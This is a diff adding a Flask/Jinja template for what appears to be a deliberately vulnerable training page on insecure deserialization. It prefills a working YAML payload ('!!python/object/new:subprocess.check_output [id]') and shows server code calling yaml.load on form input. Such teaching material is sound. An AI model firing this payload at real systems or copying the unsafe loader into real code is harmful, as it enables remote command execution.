@@ -1,0 +1,93 @@
+{% extends 'base.html' %}
+
+{% block content %}
+{% if article %}
+<p>Title : {{ article.title }}</p>
+<p>Content : {{ article.content }}</p>
+{% endif %}
+
+<ul class="nav nav-tabs" id="myTab" role="tablist">
+<li class="nav-item">
+    <a class="nav-link active" id="unserialize1-tab" data-toggle="tab" href="#unserialize1" role="tab">Normal Document</a>
+</li>
+<li class="nav-item">
+    <a class="nav-link" id="unserialize2-tab" data-toggle="tab" href="#unserialize2" role="tab">Execute arbitrary command</a>
+</li>
+</ul>
+<div class="tab-content" id="myTabContent">
+    <div class="tab-pane fade show active" id="unserialize1" role="tabpanel">
+        {{ self.unserialize1() }}
+    </div>
+    <div class="tab-pane fade" id="unserialize2" role="tabpanel">
+        {{ self.unserialize2() }}
+    </div>
+</div>
+
+{% endblock %}
+
+{% block unserialize1 %}
+<h2>Normal Document</h2>
+<form autocomplete="off" method="POST">
+    <div class="form-group">
+        <textarea class="form-control" name="document" rows="3">
+article:
+  title: "Yaml document"
+  content: "Content of document"
+</textarea>
+    </div>
+    <div class="form-group">
+        <button type="submit" class="btn btn-primary" id="btn-unserialize1">Submit</button>
+    </div>
+</form>
+{% endblock %}
+
+{% block unserialize2 %}
+<h2>Execute arbitrary command</h2>
+<form autocomplete="off" method="POST">
+    <div class="form-group">
+        <textarea class="form-control" name="document" rows="3">
+article:
+  title: "Yaml document"
+  content: !!python/object/new:subprocess.check_output [id]
+</textarea>
+    </div>
+    <div class="form-group">
+        <button type="submit" class="btn btn-primary" id="btn-unserialize2">Submit</button>
+    </div>
+</form>
+{% endblock %}
+
+{% block sources %}
+{% filter markdown %}
+<div class="btn-group" role="group" aria-label="Basic example">
+  <button type="button" class="btn btn-secondary" data-toggle="collapse" data-target="#collapseOne">GET /a8-deserialization</button>
+  <button type="button" class="btn btn-secondary" data-toggle="collapse" data-target="#collapseTwo">POST /a8-deserialization</button>
+</div>
+
+<div class="accordion" id="accordionExample">
+    <div class="card">
+      <div id="collapseOne" class="collapse show" aria-labelledby="headingOne" data-parent="#accordionExample">
+        <div class="card-body">
+```python
+@app.route('/a8-deserialization')
+def get_a8_deserialization():
+    return render_template("deserialization.html",title="A8 - Insecure Deserialization")
+```
+        </div>
+      </div>
+    </div>
+    <div class="card">
+      <div id="collapseTwo" class="collapse" aria-labelledby="headingTwo" data-parent="#accordionExample">
+        <div class="card-body">
+```python
+@app.route('/a8-deserialization',methods=['POST'])
+def post_a8_deserialization():
+    y = yaml.load(request.form['document'])
+    return render_template("deserialization.html",article={"title":y['article']['title'],"content":y['article']['content']},title="A8 - Insecure Deserialization")
+```  
+</div>
+</div>
+</div>
+</div>
+{% endfilter %}
+{% endblock %}
